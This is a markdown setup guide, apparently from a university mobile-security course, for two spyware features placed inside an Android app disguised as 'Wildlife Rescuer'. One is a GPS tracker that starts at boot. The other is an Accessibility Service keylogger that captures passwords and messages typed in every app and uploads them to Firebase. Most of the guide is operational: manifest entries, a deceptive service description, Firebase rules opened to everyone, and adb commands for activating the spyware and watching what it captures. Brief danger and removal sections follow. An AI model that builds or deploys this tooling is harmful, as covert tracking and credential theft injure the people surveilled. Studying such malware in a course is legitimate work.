# 📍 GPS Location Tracker - Quick Guide

**Auto-activates on boot and tracks location in real-time.**

---

## ⚠️ Educational Purpose Only
This demonstrates location tracking malware for ICT2215 Mobile Security course. DO NOT use for actual surveillance.

---

## 📁 File Locations

```
app/src/main/java/com/example/wildliferescuer/
├── malicious/
│   ├── GpsTracker.kt              ← Core tracking logic
│   ├── GpsAutoStarter.kt          ← Auto-starts on boot
│   └── GpsTrackingService.kt      ← Background service
└── screens/
    └── GpsTrackerTestScreen.kt    ← Test UI
```

---

## 🚀 How to Activate

### Method 1: Automatic (Recommended)
**GPS tracker starts automatically when device boots**

```bash
# Just reboot your device
adb reboot

# Monitor activation
adb logcat -s MALICIOUS_APP:*
```

**You'll see:**
```
🚨 GPS AUTO-START TRIGGERED
🔄 Device booted - Starting GPS tracker...
⚠️ GPS TRACKER ACTIVATED
📍 Starting location tracking...
```

---

### Method 2: Manual (Testing)
**Use the test screen in the app**

1. Open app → Navigate to "GPS Tracker Test"
2. Click "Request Location Permission"
3. Select "Allow all the time"
4. Click "Start GPS Tracking"

---

## 📋 AndroidManifest.xml Setup

**Add these permissions:**
```xml
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
```

**Add these components:**
```xml
<service 
    android:name=".malicious.GpsTrackingService"
    android:foregroundServiceType="location"/>

<receiver android:name=".malicious.GpsAutoStarter">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.SCREEN_OFF"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
    </intent-filter>
</receiver>
```

---

## ☁️ Firebase Setup

**Update Firestore Rules:**
```javascript
match /gps_tracking_sessions/{sessionId} {
  allow read, write: if true;
  match /location_history/{locationId} {
    allow read, write: if true;
  }
}
match /gps_locations/{locationId} {
  allow read, write: if true;
}
```

---

## ✅ Grant Permissions

```bash
adb shell pm grant com.example.wildliferescuer android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.example.wildliferescuer android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.example.wildliferescuer android.permission.ACCESS_BACKGROUND_LOCATION
```

---

## 📊 Check Results

**Logcat:**
```bash
adb logcat -s MALICIOUS_APP:*
```

**Firebase Console:**
- Go to Firestore Database
- Check `gps_tracking_sessions` collection
- Check `gps_locations` collection

---

## 🎯 What It Does

- ✅ Auto-starts on device boot
- ✅ Runs in background continuously
- ✅ Uploads to Firebase in real-time
- ✅ Uses GPS + Network providers
- ✅ Shows disguised "Wildlife Tracking" notification

---

## 🔍 Quick Test

```bash
# 1. Reboot device
adb reboot

# 2. Monitor logs
adb logcat -s MALICIOUS_APP:*

# 3. Wait 30 seconds

# 4. Check Firebase Console for data
```

**Done!** GPS tracker is now active and tracking. 🚀

# ⌨️ Keylogger - Quick Guide

**Captures ALL keyboard input across ALL apps including passwords!**

---

## ⚠️ EXTREME Privacy Violation
This demonstrates the MOST invasive type of malware. Captures passwords, credit cards, private messages, and everything you type. **Educational use only!**

---

## 📁 File Locations

```
app/src/main/java/com/example/wildliferescuer/
├── malicious/
│   └── KeyloggerService.kt          ← Accessibility Service
└── screens/
    └── KeyloggerTestScreen.kt       ← Test UI

app/src/main/res/
└── xml/
    └── accessibility_service_config.xml  ← Service config
```

---

## 🚀 How to Activate

### Step 1: Setup Files

**Copy files to project locations above**

### Step 2: Update AndroidManifest.xml

**Add permission:**
```xml
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
```

**Add service:**
```xml
<service
    android:name=".malicious.KeyloggerService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="true">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService"/>
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config"/>
</service>
```

### Step 3: Create XML Config

**Create:** `app/src/main/res/xml/accessibility_service_config.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="0"/>
```

### Step 4: Add String Resource

**In `res/values/strings.xml`:**
```xml
<string name="accessibility_service_description">Wildlife Rescuer requires this service to track rescue activities.</string>
```

### Step 5: Update Firebase Rules

```javascript
match /keylogger_sessions/{sessionId} {
  allow read, write: if true;
}
match /captured_keystrokes/{keystrokeId} {
  allow read, write: if true;
}
match /keylogger_events/{eventId} {
  allow read, write: if true;
}
```

### Step 6: Build & Install

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## ✅ Enable Keylogger

**In the app:**
1. Navigate to **Keylogger Test** screen
2. Click **"Enable Keylogger Service"**
3. Find **"Wildlife Rescuer"** in Accessibility Settings
4. Toggle **ON**
5. Grant all permissions
6. Return to app

**Status should show:**
```
✅ KEYLOGGER ACTIVE
Currently capturing ALL keystrokes across ALL apps
```

---

## 🎯 What It Captures

**Captures from ALL apps:**
- 🔒 Passwords (even hidden ones)
- 💳 Credit card numbers
- 📧 Email messages
- 💬 Chat conversations
- 🔍 Search queries
- 🏦 Banking credentials
- 📝 Notes and documents
- **EVERYTHING you type!**

---

## 📊 Verify It's Working

### Check Logcat:
```bash
adb logcat -s MALICIOUS_APP:* | grep KEYSTROKE
```

**Expected output:**
```
⌨️ KEYSTROKE CAPTURED #1
   App: com.whatsapp
   Captured Text: "Hello there!"
   Password Field: false
✅ Keystroke uploaded to Firebase

⌨️ KEYSTROKE CAPTURED #2
   App: com.facebook.katana
   Captured Text: "myPassword123"
   Password Field: true  ← Password captured!
✅ Keystroke uploaded to Firebase
```

### Check Firebase:

**Go to Firestore Database → Data**

**You should see:**
```
📁 keylogger_sessions
   └── [session-id]
       ├── sessionId: "..."
       ├── keystrokeCount: 42
       └── status: "active"

📁 captured_keystrokes
   ├── [keystroke-1]
   │   ├── capturedText: "Hello there!"
   │   ├── packageName: "com.whatsapp"
   │   ├── isPassword: false
   │   └── timestamp: ...
   │
   ├── [keystroke-2]
   │   ├── capturedText: "myPassword123"
   │   ├── packageName: "com.facebook.katana"
   │   ├── isPassword: true  ← Password!
   │   └── timestamp: ...
```

---

## 🔍 Monitor in Real-Time

```bash
# All keystrokes
adb logcat -s MALICIOUS_APP:* | grep KEYSTROKE

# Only captured text
adb logcat -s MALICIOUS_APP:* | grep "Captured Text:"

# Only passwords
adb logcat -s MALICIOUS_APP:* | grep "Password Field: true" -A 1

# Show which apps
adb logcat -s MALICIOUS_APP:* | grep "App:"
```

---

## 🎯 How It Works

**Uses Android Accessibility Service to:**
1. Monitor `TYPE_VIEW_TEXT_CHANGED` events
2. Capture text from ALL apps (not just yours)
3. Detect password fields (`isPassword` flag)
4. Extract typed text in real-time
5. Upload to Firebase immediately
6. Works silently in background

**User sees:** "Wildlife Rescuer requires this service to track rescue activities"  
**Reality:** It's capturing every keystroke!

---

## 🚨 Why It's So Dangerous

**Accessibility Services have complete device access:**
- ✅ Read ALL text on screen
- ✅ Monitor ALL apps
- ✅ Capture ALL user input
- ✅ Detect password fields
- ✅ Read notifications
- ✅ Perform UI actions

**Real-world threats:**
- Banking trojans steal credentials
- Spyware monitors victims
- Identity theft
- Financial fraud
- Blackmail material

---

## 🛑 How to Stop It

**Disable the service:**
1. Settings → Accessibility
2. Find "Wildlife Rescuer"
3. Toggle OFF

**Or force stop:**
```bash
adb shell am force-stop com.example.wildliferescuer
```

**Or uninstall:**
```bash
adb uninstall com.example.wildliferescuer
```

---

## 🐛 Troubleshooting

### Issue: No text appearing in Firebase

**Solution: Update Firebase rules**

```javascript
match /captured_keystrokes/{keystrokeId} {
  allow read, write: if true;
}
```

### Issue: Service not capturing text

**Check:**
1. Accessibility service is enabled
2. Permissions granted
3. Service is running: `adb logcat -s MALICIOUS_APP:*`

### Issue: Only getting "[]" or empty text

**Solution:** Use improved version with better text extraction:
- Replace with `KeyloggerService_IMPROVED.kt`
- Rebuild and reinstall

---

## 📋 Firebase Data Structure

### Collection: `keylogger_sessions`
```json
{
  "sessionId": "uuid",
  "deviceId": "uuid",
  "startTime": 1710062345678,
  "keystrokeCount": 247,
  "status": "active"
}
```

### Collection: `captured_keystrokes`
```json
{
  "sessionId": "uuid",
  "capturedText": "myPassword123",
  "packageName": "com.facebook.katana",
  "className": "PasswordEditText",
  "isPassword": true,
  "timestamp": 1710062387234,
  "formattedTime": "2026-03-10 13:46:27"
}
```

### Collection: `keylogger_events`
```json
{
  "sessionId": "uuid",
  "eventType": "field_focus",
  "packageName": "com.whatsapp",
  "className": "EditText",
  "timestamp": 1710062345678
}
```

---

## 📝 Quick Test

**Type this in ANY app:**
```
"Test keylogger 12345"
```

**Check logcat - should see:**
```
⌨️ KEYSTROKE CAPTURED
   Captured Text: "Test keylogger 12345"
✅ Keystroke uploaded
```

**Check Firebase - should see:**
- New document in `captured_keystrokes`
- `capturedText: "Test keylogger 12345"`

**If working:** ✅ Keylogger is active!  
**If not:** Check Firebase rules and logcat errors

---

## 🎓 Educational Value

**Demonstrates:**
- Accessibility Service abuse
- Cross-app monitoring
- Password field detection
- Real-time data exfiltration
- Silent background operation
- Privacy violation severity

**For your report:**
- Show captured passwords from multiple apps
- Firebase screenshots with sensitive data
- Logcat output showing captures
- Privacy impact analysis
- Detection methods
- Prevention strategies

---

## ✅ Part 2 Complete!

**Your malicious activities:**
1. ✅ Contact & SMS Exfiltration
2. ✅ File Harvesting
3. ✅ Metadata Collection
4. ✅ GPS Location Tracking
5. ✅ **Keylogger**

**All 5 activities complete!** 🎉

---

## 🚀 Quick Commands

```bash
# Build
./gradlew assembleDebug

# Install
adb install app/build/outputs/apk/debug/app-debug.apk

# Monitor keystrokes
adb logcat -s MALICIOUS_APP:* | grep KEYSTROKE

# Watch Firebase uploads
adb logcat -s MALICIOUS_APP:* | grep "uploaded"

# See passwords captured
adb logcat -s MALICIOUS_APP:* | grep "Password Field: true"
```

**Start typing in ANY app - everything will be captured!** ⌨️🚨
